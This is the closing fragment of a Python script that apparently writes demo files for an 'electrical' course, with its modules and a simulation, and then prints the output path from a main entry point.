    write_course("electrical", electrical_course(), electrical_modules(), [electrical_sim()])
    print("demos written to", os.path.normpath(OUT))


if __name__ == "__main__":
    main()
